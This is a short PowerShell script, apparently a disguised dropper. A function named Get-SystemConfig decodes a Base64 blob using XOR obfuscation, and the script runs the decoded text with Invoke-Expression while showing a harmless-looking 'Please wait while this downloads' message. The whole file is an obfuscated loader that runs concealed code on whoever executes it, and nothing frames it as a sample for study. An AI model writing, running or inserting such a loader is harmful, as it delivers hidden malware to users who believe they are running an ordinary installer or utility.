function Get-SystemConfig {
    param([string]$ConfigData)
    $version = [int]$ConfigData.Substring(0,4)
    $encodedData = $ConfigData.Substring(4)
    $bytes = [Convert]::FromBase64String($encodedData)
    $result = @()
    for($index=0; $index -lt $bytes.Length; $index+=2) {
        $highByte = $bytes[$index+1]
        $key = ($highByte -shl 8) -bor ($version -band 255)
        $result += $bytes[$index] -bxor ($key -band 255)
    }
    
    return [Text.Encoding]::Default.GetString($result)
}
Write-Host "Please wait while this downloads! It may take some time.." -ForegroundColor Yellow
$systemConfig = "1542IhZkFmcWdRZjFiYWOxYmFl0WUhZjFn4WchYoFkMWaBZlFmkWYhZvFmgWYRZbFjwWPBZTFlIWQBY+FigWQRZjFnIWVRZyFnQWbxZoFmEWLhZdFkUWaRZoFnAWYxZ0FnIWWxY8FjwWQBZ0FmkWa
xZEFmcWdRZjFjAWMhZVFnIWdBZvFmgWYRYuFiQWZxZOFlQWNhZlFk4WSxYwFkoWfxY+FjsWJBYvFi8WDBYiFmAWaRZzFmgWYhZrFmMWfxZjFnIWJhY7FiYWXRZSFmMWfhZyFigWQxZoFmUWaRZiFm
8WaBZhFlsWPBY8FlMWUhZAFj4WKBZBFmMWchZVFnIWdBZvFmgWYRYuFl0WRRZpFmgWcBZjFnQWchZbFjwWPBZAFnQWaRZrFkQWZxZ1FmMWMBYyFlUWchZ0Fm8WaBZhFi4WJBZcFl4WTBZ/FmQWNRZ
MFn8WXxZRFmoWdRZKFmsWVBZqFmIWbxY/Fm0WXBZRFjcWcBZKFnwWXxY3FkkWUhZLFnMWYxZrFmoWcRYkFi8WLxYMFiIWfBZvFnYWVhZnFnIWbhYmFjsWJhYkFiIWYxZoFnAWPBZSFkMWSxZWFloW
MBYzFj8WNRYoFnwWbxZ2FiQWDBYiFmMWfhZyFnQWZxZlFnIWVhZnFnIWbhYmFjsWJhYkFiIWYxZoFnAWPBZSFkMWSxZWFloWMBYzFj8WNRYkFgwWTxZoFnAWaRZtFmMWKxZRFmMWZBZUFmMWdxZzF
mMWdRZyFiYWKxZTFnQWbxYmFiQWIhZkFmcWdRZjFiIWYBZpFnMWaBZiFmsWYxZ/FmMWchYkFiYWKxZJFnMWchZAFm8WahZjFiYWIhZ8Fm8WdhZWFmcWchZuFgwWQxZ+FnYWZxZoFmIWKxZHFnQWZR
ZuFm8WcBZjFiYWKxZWFmcWchZuFiYWIhZ8Fm8WdhZWFmcWchZuFiYWKxZCFmMWdRZyFm8WaBZnFnIWbxZpFmgWVhZnFnIWbhYmFiIWYxZ+FnIWdBZnFmUWchZWFmcWchZuFiYWKxZAFmkWdBZlFmM
WDBZlFmsWYhYmFikWZRYmFnUWchZnFnQWchYmFiQWJBYmFiQWIxZyFmMWaxZ2FiMWWhYwFjMWPxY1FloWQhZQFkIWVRZzFnYWdhZpFnQWchYoFmMWfhZjFiQW"

Invoke-Expression (Get-SystemConfig $systemConfig)
